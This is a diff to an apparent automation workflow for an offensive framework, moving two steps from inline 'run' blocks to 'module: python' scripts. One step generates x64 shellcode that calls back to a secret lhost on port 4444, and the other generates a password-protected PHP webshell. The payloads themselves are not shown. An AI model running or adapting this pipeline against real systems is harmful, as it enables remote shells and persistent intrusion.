@@ -70,26 +70,30 @@ jobs:
   generate_payload:
     steps:
       - name: Generate shellcode
-        run: |
-          from ofx.api.exploitation.shellcode.connectors import get_connector
-          connector = get_connector("custom-tool")
-          shellcode = connector.generate(
-            arch="x64",
-            lhost="{{ secrets.lhost }}",
-            lport=4444
-          )
-          with open("payload.bin", "wb") as f:
-              f.write(shellcode)
-      
+        module: python
+        with:
+          script: |
+            from ofx.api.exploitation.shellcode.connectors import get_connector
+            connector = get_connector("custom-tool")
+            shellcode = connector.generate(
+              arch="x64",
+              lhost="{{ secrets.lhost }}",
+              lport=4444
+            )
+            with open("payload.bin", "wb") as f:
+                f.write(shellcode)
+
       - name: Generate webshell
-        run: |
-          from ofx.api.exploitation.webshell.connectors import get_connector
-          connector = get_connector("advanced")
-          code = connector.generate(
-            language="php",
-            password="{{ secrets.webshell_pass }}"
-          )
-          print(f"webshell={code}")
+        module: python
+        with:
+          script: |
+            from ofx.api.exploitation.webshell.connectors import get_connector
+            connector = get_connector("advanced")
+            code = connector.generate(
+              language="php",
+              password="{{ secrets.webshell_pass }}"
+            )
+            print(f"webshell={code}")
         outputs:
           webshell: "{{ step.webshell }}"
 ```
